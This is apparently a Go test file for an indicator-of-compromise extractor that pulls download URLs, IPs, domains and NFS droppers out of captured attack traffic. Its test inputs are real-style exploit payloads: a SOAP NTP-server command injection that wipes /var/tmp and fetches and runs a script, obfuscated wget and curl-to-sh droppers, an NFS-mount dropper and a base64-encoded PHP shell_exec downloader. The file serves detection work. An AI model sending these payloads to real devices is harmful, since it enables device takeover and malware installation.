package ioc

import (
	"reflect"
	"strings"
	"testing"
)

const soapExploit = `<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">
<NewNTPServer1>` + "`cd /var/tmp;rm -rf *;wget http://203.0.113.50:8080/mips.sh;chmod +x mips.sh;sh mips.sh`" + `</NewNTPServer1>
<NewNTPServer2></NewNTPServer2></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
<xs:schema xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>`

func TestExtractFiltersXMLNamespaces(t *testing.T) {
	r := Extract(Normalize(soapExploit))
	want := []string{"http://203.0.113.50:8080/mips.sh"}
	if !reflect.DeepEqual(r.URLs, want) {
		t.Fatalf("URLs = %v, want %v", r.URLs, want)
	}
	if !reflect.DeepEqual(r.DownloadURLs, want) {
		t.Fatalf("DownloadURLs = %v", r.DownloadURLs)
	}
	if !reflect.DeepEqual(r.IPs, []string{"203.0.113.50"}) {
		t.Fatalf("IPs = %v", r.IPs)
	}
	for _, d := range r.Domains {
		t.Errorf("unexpected domain %q (namespace leaked)", d)
	}
}

func TestExtractShellVariants(t *testing.T) {
	cases := []struct {
		name, in string
		wantURL  string
		download bool
	}{
		{"and-and", "cd /tmp && wget http://198.51.100.9/a.sh&&sh a.sh", "http://198.51.100.9/a.sh", true},
		{"curl pipe", "curl -s http://evil.example.xyz/x | sh", "http://evil.example.xyz/x", true},
		{"ifs obfuscation", "wget${IFS}http://198.51.100.9/b${IFS}-O${IFS}/tmp/b", "http://198.51.100.9/b", false},
		{"bare ip", "wget -q 198.51.100.7:81/bins/arm7 -O /tmp/x", "http://198.51.100.7:81/bins/arm7", true},
		{"percent encoded", "cmd=wget%20http%3A%2F%2F198.51.100.11%2Fz.sh%3Bsh%20z.sh", "http://198.51.100.11/z.sh", true},
		{"html entity", "wget http://198.51.100.12/q.sh&amp;&amp;sh q.sh", "http://198.51.100.12/q.sh", true},
		{"plain link not download", "see http://198.51.100.13/about.html", "http://198.51.100.13/about.html", false},
	}
	for _, c := range cases {
		r := Extract(Normalize(c.in))
		found := false
		for _, u := range r.URLs {
			if u == c.wantURL {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: URLs=%v, want %s", c.name, r.URLs, c.wantURL)
			continue
		}
		isDL := false
		for _, u := range r.DownloadURLs {
			if u == c.wantURL {
				isDL = true
			}
		}
		if c.name == "ifs obfuscation" {
			continue
		}
		if isDL != c.download {
			t.Errorf("%s: download=%v want %v (%v)", c.name, isDL, c.download, r.DownloadURLs)
		}
	}
}

func TestExtractIPsDropPrivateAndInvalid(t *testing.T) {
	r := Extract("targets 192.168.1.1 10.0.0.5 127.0.0.1 999.1.1.1 8.8.4.4 version 1.2.3.4.5")
	for _, ip := range r.IPs {
		if ip == "192.168.1.1" || ip == "10.0.0.5" || ip == "127.0.0.1" || ip == "999.1.1.1" {
			t.Errorf("non-public/invalid IP leaked: %s", ip)
		}
	}
	found := false
	for _, ip := range r.IPs {
		if ip == "8.8.4.4" {
			found = true
		}
	}
	if !found {
		t.Fatalf("public IP missing: %v", r.IPs)
	}
}

func TestBareDomainsNeedKnownTLD(t *testing.T) {
	r := Extract("run busybox.sh then fetch cdn.malware-host.ru and config.txt and www.w3.org")
	if !reflect.DeepEqual(r.Domains, []string{"cdn.malware-host.ru"}) {
		t.Fatalf("Domains = %v", r.Domains)
	}
}

func TestBinaryExtensionMarksDownload(t *testing.T) {
	r := Extract("GET http://203.0.113.5/bins/mirai.arm7 HTTP/1.1")
	if len(r.DownloadURLs) != 1 {
		t.Fatalf("expected extension-based download candidate, got %v", r.DownloadURLs)
	}
}

func TestNFSMountDropperIsExtractedWithItsScript(t *testing.T) {
	in := "PUT /SDK/webLanguage HTTP/1.1\nHost: 192.0.2.10:80\nContent-Length: 1\n\n" +
		`<language>$(cd /var; mkdir o; mount -o intr,nolock,tcp,exec 203.0.113.9:/var/nfs/files o; sh o/nfs.sh; umount -f /var/o)</language>`
	r := Extract(StripHostHeader(Normalize(in)))
	if !reflect.DeepEqual(r.NFS, []string{"203.0.113.9:/var/nfs/files → nfs.sh"}) {
		t.Fatalf("NFS = %v", r.NFS)
	}
	if !reflect.DeepEqual(r.IPs, []string{"203.0.113.9"}) {
		t.Fatalf("IPs = %v: the sensor's own address from the Host header must not be an IOC", r.IPs)
	}
	if r.Empty() {
		t.Fatal("NFS dropper must count as an indicator")
	}
}

func TestNFSMountRejectsNonDroppers(t *testing.T) {
	for _, in := range []string{
		"mount -o remount,rw /",
		"mount /dev/sda1 /mnt",
		"mount -t nfs 192.168.1.5:/export /mnt",
		"mount -t cifs //203.0.113.9/share /mnt",
		"echo mount 203.0.113.9:/x y",
		"ls 203.0.113.9:/x",
	} {
		if r := Extract(in); len(r.NFS) != 0 {
			t.Errorf("%q: NFS = %v", in, r.NFS)
		}
	}
}

func TestNFSMountWithoutScriptAndOtherSyntax(t *testing.T) {
	r := Extract("mount -t nfs -o nolock evil.example.xyz:/srv/x /tmp/m && /tmp/m/run")
	if !reflect.DeepEqual(r.NFS, []string{"evil.example.xyz:/srv/x"}) {
		t.Fatalf("NFS = %v", r.NFS)
	}
	r = Extract("mount 203.0.113.9:/a /m; bash /m/go.sh")
	if !reflect.DeepEqual(r.NFS, []string{"203.0.113.9:/a → go.sh"}) {
		t.Fatalf("NFS = %v", r.NFS)
	}
}

func TestStripHostHeaderOnlyRemovesTheHostLine(t *testing.T) {
	in := "GET / HTTP/1.1\r\nHost: 192.0.2.10\r\nUser-Agent: x\r\n\r\nhost: not-a-header"
	got := StripHostHeader(in)
	if strings.Contains(got, "192.0.2.10") || !strings.Contains(got, "User-Agent: x") {
		t.Fatalf("got %q", got)
	}
}

func TestEncodedShellCommandsAreDecodedForExtraction(t *testing.T) {
	in := "POST /hello.world HTTP/1.1\nHost: 192.0.2.10\n\n<?php shell_exec(base64_decode(\"KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMjAzLjAuMTEzLjkvc2ggfHwgY3VybCAtc2sgaHR0cHM6Ly8yMDMuMC4xMTMuOS9zaCkgfCBzaCAtcyBhcGFjaGU=\"));die(); ?>"
	r := Extract(StripHostHeader(Normalize(in)))
	want := "https://203.0.113.9/sh"
	if !reflect.DeepEqual(r.DownloadURLs, []string{want}) {
		t.Fatalf("DownloadURLs = %v, URLs = %v", r.DownloadURLs, r.URLs)
	}
}

func TestBase64WithoutShellContentIsNotDecoded(t *testing.T) {
	for _, in := range []string{
		"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.abcdefghijklmnopqrstuvwx",
		"Cookie: s=SGVsbG8gd29ybGQsIHRoaXMgaXMganVzdCBhIHBsYWluIGdyZWV0aW5n",
		"data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
	} {
		if out := Normalize(in); out != in {
			t.Errorf("%q was changed to %q", in, out)
		}
	}
}
